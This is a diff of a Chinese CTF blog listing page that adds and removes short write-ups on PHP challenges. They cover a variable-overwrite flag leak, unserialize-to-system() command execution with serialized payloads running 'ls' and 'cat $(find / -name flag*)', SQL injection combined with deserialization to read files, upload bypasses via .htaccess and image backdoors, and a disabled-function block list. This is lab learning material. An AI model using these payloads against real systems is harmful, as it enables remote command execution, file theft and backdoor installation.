@@ -71,6 +71,200 @@
       <div class="outer">
         <section id="main">
   
+    <article id="post-page-59" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2021/07/08/page-59/" class="article-date">
+  <time class="dt-published" datetime="2021-07-08T06:51:57.000Z" itemprop="datePublished">2021-07-08</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="p-name article-title" href="/2021/07/08/page-59/">BJDCTF2020Mark loves cat</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <?php
+include 'flag.php';
+$yds = "dog";
+$is = "cat";
+$handsome = 'yds';
+
+foreach($_POST as $x => $y){
+    $$x = $y;
+}
+
+foreach($_GET as $x => $y){              //通过post方式传递$flag=flag，最终结果为$$flag=flag    这便是POST方式处理代码
+    $$x = $$y;
+}
+
+foreach($_GET as $x => $y){
+    if($_GET['flag'] === $x && $x !== 'flag'){              //通过get传递yds=flag 得到$yds=$flag  
+        exit($handsome);
+    }
+}
+
+if(!isset($_GET['flag']) && !isset($_POST['flag'])){                          //get和post中不存在flag参数便退出程序输出$yds变量，得到flag 
+    exit($yds);
+}
+
+if($_POST['flag'] === 'flag'  || $_GET['flag'] === 'flag'){
+    exit($is);
+}
+
+echo "the flag is: ".$flag;"    //这是index.php 的源码
+**根据$$和foreach可以判断可能存在变量覆盖漏洞**，也就是可以将$yds，$is，$handsome的值进行覆盖成$flag变量，然后输出对应变量的值，获取flag。
+例如代码第17-19行，需要get传参?flag=flag，才能进入if语句中输出$handsome，但是foreach中并不能将$flag赋值给$handsome然后输出，所以此处无法利用。
+扫描**目录找到 .git 泄露** 
+**然后githack 把源码下下来**
+发现就两个重要文件，flag.php，读取flag文件内容并赋值给$flag:
+index.php，开头有个包含，在最后有个输出flag
+ if(!isset($_GET['flag']) && !isset($_POST['flag'])){
+    exit($yds);
+ }   发现get和post中不存在flag参数便退出程序输出$yds变量 
+传递如下参数 ：
+get: yds=flag
+post: $flag=flag
+
+那么最终payload  **?yds=flag**
+         **              post: $flag=flag**
+
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2021/07/08/page-59/" data-id="cksyl7wjq001fw4w75yhu80oc" data-title="BJDCTF2020Mark loves cat" class="article-share-link">Share</a>
+      
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+
+  
+    <article id="post-page-58" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2021/07/08/page-58/" class="article-date">
+  <time class="dt-published" datetime="2021-07-08T06:44:25.000Z" itemprop="datePublished">2021-07-08</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="p-name article-title" href="/2021/07/08/page-58/">网鼎杯 2020 朱雀组phpweb</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <p>主页这边抓包发现 func=date&amp;p=Y-m-d+h%3Ai%3As+a  这句话这边可以传参 </p>
+<p>func=file_get_contents&amp;p=index.php  然后给了一堆的源码</p>
+<?php
+$disable_fun = array("exec","shell_exec","system","passthru","proc_open","show_source","phpinfo","popen","dl","eval","proc_terminate","touch","escapeshellcmd","escapeshellarg","assert","substr_replace","call_user_func_array","call_user_func","array_filter", "array_walk",  "array_map","registregister_shutdown_function","register_tick_function","filter_var", "filter_var_array", "uasort", "uksort", "array_reduce","array_walk", "array_walk_recursive","pcntl_exec","fopen","fwrite","file_put_contents");       ；这边func可以用的功能被禁用了一大堆就很烦 但是反序列化可以
+function gettime($func, $p) {
+    $result = call_user_func($func, $p);
+    $a= gettype($result);
+    if ($a == "string") {
+        return $result;
+    } else {return "";}
+}
+class Test {
+    var $p = "Y-m-d h:i:s a";
+    var $func = "date";
+    function __destruct() {
+        if ($this->func != "") {
+            echo gettime($this->func, $this->p);
+        }
+    }
+}
+$func = $_REQUEST["func"];
+$p = $_REQUEST["p"];
+
+if ($func != null) {
+    $func = strtolower($func);
+    if (!in_array($func,$disable_fun)) {
+        echo gettime($func, $p);
+    }else {
+        die("Hacker...");
+    }
+}
+?>
+
+<p>虽然被禁用了一大堆但是还有反序列化可以用  func=unserialize&amp;p=index.php</p>
+<?php
+class Test {
+    var $p = "ls";
+    var $func = "system";
+    function __destruct() {
+        if ($this->func != "") {
+            echo gettime($this->func, $this->p);
+        }
+    }
+}
+
+$a=new Test();
+echo serialize($a);    
+
+贴一下构造的序列化代码构造这个生成O:4:"Test":2:{s:1:"p";s:2:"ls";s:4:"func";s:6:"system";} 
+
+payload1
+
+ func=unserialize&p=O:4:"Test":2:{s:1:"p";s:2:"ls";s:4:"func";s:6:"system";}   获得文件列表
+
+func=unserialize&p=O:4:"Test":2:{s:1:"p";s:14:"ls ../../../..";s:4:"func";s:6:"system";}  然后给了更多
+
+
+
+但是你丫的怎么没有flag ┗|｀O′|┛
+
+![wwwwww.png](https://github.com/ajin-max/ajin-max.github.io/blob/master/img/wwwwww.png?raw=true)
+
+**知识点：寻找flag文件常用命令小结：**
+system(‘ls’) : 列举当前目录下的所有文件
+system(“find / -name flag*”)：查找所有文件名匹配flag*的文件
+system(“cat $(find / -name flag*)”)：打印所有文件名匹配flag*的文件
+
+那么这个p就得变成p=cat $(find / -name flag*)
+
+func=unserialize&p=O:4:"Test":2:{s:1:"p";s:25:"cat $(find / -name flag*)";s:4:"func";s:6:"system";}  最终payload
+
+![weww.png](https://github.com/ajin-max/ajin-max.github.io/blob/master/img/weww.png?raw=true)
+
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2021/07/08/page-58/" data-id="cksyl7wjp001ew4w712j25o07" data-title="网鼎杯 2020 朱雀组phpweb" class="article-share-link">Share</a>
+      
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+
+  
     <article id="post-page-57" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
   <div class="article-meta">
     <a href="/2021/07/08/page-57/" class="article-date">
@@ -476,122 +670,6 @@ if(isset($_GET['exp'])){       ；典型的木马get方式
 
 
   
-    <article id="post-page-47" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
-  <div class="article-meta">
-    <a href="/2021/05/03/page-47/" class="article-date">
-  <time class="dt-published" datetime="2021-05-02T23:59:01.000Z" itemprop="datePublished">2021-05-03</time>
-</a>
-    
-  </div>
-  <div class="article-inner">
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="p-name article-title" href="/2021/05/03/page-47/">dvwa 文件上传</a>
-    </h1>
-  
-
-      </header>
-    
-    <div class="e-content article-entry" itemprop="articleBody">
-      
-        <p>low 直接上传后门文件检查都不检查的</p>
-<p>medium 上传的时候用jpg 然后burp改或者直接php 然后burp从Content-Type 那边改image/jpeg </p>
-<p>high 上传图片马然后用文件包含漏</p>
-
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="http://example.com/2021/05/03/page-47/" data-id="cksyl7wjj0015w4w71nff4tod" data-title="dvwa 文件上传" class="article-share-link">Share</a>
-      
-      
-      
-    </footer>
-  </div>
-  
-</article>
-
-
-
-  
-    <article id="post-page-46" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
-  <div class="article-meta">
-    <a href="/2021/05/03/page-46/" class="article-date">
-  <time class="dt-published" datetime="2021-05-02T23:58:56.000Z" itemprop="datePublished">2021-05-03</time>
-</a>
-    
-  </div>
-  <div class="article-inner">
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="p-name article-title" href="/2021/05/03/page-46/">刷题4</a>
-    </h1>
-  
-
-      </header>
-    
-    <div class="e-content article-entry" itemprop="articleBody">
-      
-        <p><strong>[网鼎杯2018]fakebook题解</strong>  先注册一个 然后发现/view.php?no=1 貌似可以sql注入?no=-1 显示了Notice: Trying to get property of non-object in /var/www/html/view.php on line 53 数字型 的所有就?no=0  扫后台发现robots.txt 然后又发现一个user.php.bak   可以大概猜一猜flag位置<br>然后这又是一个序列化题目<br>&lt;?php</p>
-<p>class UserInfo<br>{<br>    public $name = “aaad”;<br>    public $age = 19;<br>    public $blog = “file:///var/www/html/flag.php”;</p>
-<pre><code>public function __construct($name, $age, $blog)
-&#123;
-    $this-&gt;name = $name;
-    $this-&gt;age = (int)$age;
-    $this-&gt;blog = $blog;
-&#125;
-
-function get($url)
-&#123;
-    $ch = curl_init();
-
-    curl_setopt($ch, CURLOPT_URL, $url);
-    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
-    $output = curl_exec($ch);
-    $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
-    if($httpCode == 404) &#123;
-        return 404;
-    &#125;
-    curl_close($ch);
-
-    return $output;
-&#125;
-
-public function getBlogContents ()
-&#123;
-    return $this-&gt;get($this-&gt;blog);
-&#125;
-
-public function isValidBlog ()
-&#123;
-    $blog = $this-&gt;blog;
-    return preg_match(&quot;/^(((http(s?))\:\/\/)?)([0-9a-zA-Z\-]+\.)+[a-zA-Z]&#123;2,6&#125;(\:[0-9]+)?(\/\S*)?$/i&quot;, $blog);
-&#125;
-</code></pre>
-<p>}<br>$a = new UserInfo(“aaad”,19,”file:///var/www/html/flag.php”);<br>var_dump(serialize($a));<br>?&gt;   构造这个然后复制一波 aaad 19 4399 这些是自己弄 要弄什么都可以 ?no=-1/<strong>/union/</strong>/select/<strong>/1,2,3,’O:8:”UserInfo”:3:{s:4:”name”;s:4:”aaad”;s:3:”age”;i:19;s:4:”blog”;s:29:”file:///var/www/html/flag.php”;}’  然后右键查看源码 有个data text 啥的<br>那段复制然后base64解码就可<br>或者因为sql注入没有过滤load_file直接取得flag<br>no=-1 union/</strong>/select 1,load_file(“/var/www/html/flag.php”),3,4<br><strong>[GXYCTF2019]BabySQli 1</strong>  union select 1，2，3   在这个关要构造假身份     利用sqli的特性：在联合查询并不存在的数据时，联合查询就会构造一个虚拟的数据。select * from ‘users’ where name=’person’ union select 1,’admin’,’e10adc3949ba59abbe56057f20f883e’,4,5    按照我们的输入，sqli在数据库中写入数据，相当于伪造了一个身份，就可以用这个身份登录了。<br>试探id username password 这三个的顺序如何 name=aaa’ union select ‘admin’,2 #&amp;pw=qqq   显示wrong user<br>name=aaa’ union select 1,’admin’,3 #&amp;pw=qqq 显示wrong password   然后把3 改成qqq的MD5加密形式就可以了<br><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/3674%EF%BC%88%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%9A%84%E4%B8%80%E4%BA%9B%E7%9F%A5%E8%AF%86%E7%82%B9%EF%BC%89">https://xz.aliyun.com/t/3674（反序列化的一些知识点）</a><br><strong>[MRCTF2020]你传你🐎呢 1</strong><br><strong>&lt;FilesMatch “1.png”&gt;</strong><br><strong>SetHandler application/x-httpd-php</strong><br><strong></FilesMatch></strong>  传一个这样的.htaccess  这个是将1.png 默认成php   然后传一个1.png的后门文件就可以了<br><strong>[MRCTF2020]Ez_bypass 1</strong>又是一题MD5 比较的 那就数组绕过?gg[]=1&amp;id[]=2<br>然后post一个passwd=1234567a就可以了  因为  if($passwd==1234567)</p>
-
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="http://example.com/2021/05/03/page-46/" data-id="cksyl7wjj0016w4w75jukc407" data-title="刷题4" class="article-share-link">Share</a>
-      
-      
-      
-    </footer>
-  </div>
-  
-</article>
-
-
-
-  
 
 
   <nav id="page-nav">
@@ -615,7 +693,7 @@ public function isValidBlog ()
   <div class="widget-wrap">
     <h3 class="widget-title">Archives</h3>
     <div class="widget">
-      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/08/">August 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/07/">July 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/06/">June 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/05/">May 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/04/">April 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/03/">March 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/02/">February 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/01/">January 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/11/">November 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/10/">October 2020</a></li></ul>
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/09/">September 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/08/">August 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/07/">July 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/06/">June 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/05/">May 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/04/">April 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/03/">March 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/02/">February 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/01/">January 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/11/">November 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/10/">October 2020</a></li></ul>
     </div>
   </div>
 
@@ -628,6 +706,14 @@ public function isValidBlog ()
       <ul>
         
           <li>
+            <a href="/2021/09/09/page-115/">又是misc</a>
+          </li>
+        
+          <li>
+            <a href="/2021/09/09/page-114/">page</a>
+          </li>
+        
+          <li>
             <a href="/2021/08/13/page-110/">一大堆的misc 很大一堆</a>
           </li>
         
@@ -637,14 +723,6 @@ public function isValidBlog ()
         
           <li>
             <a href="/2021/08/13/page-108/">b01lers2020Welcome to Earth</a>
-          </li>
-        
-          <li>
-            <a href="/2021/08/13/page-107/">SUCTF 2019EasyWeb</a>
-          </li>
-        
-          <li>
-            <a href="/2021/08/13/page-106/">WUSTCTF2020CV Maker</a>
           </li>
         
       </ul>
